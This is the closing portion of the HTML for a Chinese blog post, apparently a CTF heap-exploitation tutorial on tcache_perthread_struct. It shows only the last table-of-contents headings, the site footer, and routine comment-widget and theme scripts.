href="#%E5%88%9B%E5%BB%BA%E5%A0%86%E5%9D%97%EF%BC%8C%E5%90%91%E5%85%B6%E4%B8%AD%E5%86%99%E5%85%A5-malloc-hook"><span class="toc-number">6.6.</span> <span class="toc-text">创建堆块，向其中写入__malloc_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E7%94%B3%E8%AF%B7%E5%A0%86%E5%9D%97%EF%BC%8C%E5%88%B0-realloc-hook"><span class="toc-number">6.7.</span> <span class="toc-text">再次申请堆块，到__realloc_hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">6.8.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#one-gadget-%E6%97%A0%E6%B3%95-getshell"><span class="toc-number">7.</span> <span class="toc-text">one_gadget 无法 getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tcache-perthread-corruption"><span class="toc-number">7.0.1.</span> <span class="toc-text">tcache perthread corruption</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-18-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84tcache_perthread_struct%EF%BC%88%E5%9F%BA%E7%A1%80%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%89%EF%BC%88%E9%99%84%EF%BC%9A%E5%90%91__malloc_hook%E4%B8%AD%E5%86%99%E5%85%A5one_gadget%E6%97%A0%E6%B3%95getshell%E7%9A%84/'
    this.page.identifier = '2020/12/02/PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的/'
    this.page.title = 'PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的问题及解决方案）'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>